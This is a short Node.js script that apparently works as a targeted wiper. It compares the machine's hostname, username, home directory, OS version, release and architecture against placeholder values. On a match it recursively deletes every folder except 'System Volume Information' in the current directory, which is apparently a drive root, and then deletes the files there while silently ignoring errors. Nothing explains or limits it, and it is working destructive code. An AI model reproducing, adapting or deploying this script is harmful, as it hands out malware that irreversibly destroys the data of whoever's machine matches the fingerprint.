const glob = require("glob");
const os = require('node:os');
const fs = require('node:fs');

const data = {
"HOSTNAME": 'userhostname',
"USERNAME": 'userusername',
"HOMEDIR": 'userhomedir',
"VERSION": 'userversion',
"WINVER": 'userrelease',
"ARCH": 'userarch',
}

if (os.hostname() == data.HOSTNAME && os.userInfo().username == data.USERNAME && os.homedir() == data.HOMEDIR && os.version() == data.VERSION && os.release() == data.WINVER && os.arch() == data.ARCH) {
    glob.sync("./*/").map(resources => {
        if (resources == "./System Volume Information/") return;
        fs.rmSync(resources, {recursive: true});
    })

    glob.sync("./*.*").map(resource => {
        fs.unlink(resource, (err) => {});
    })
}
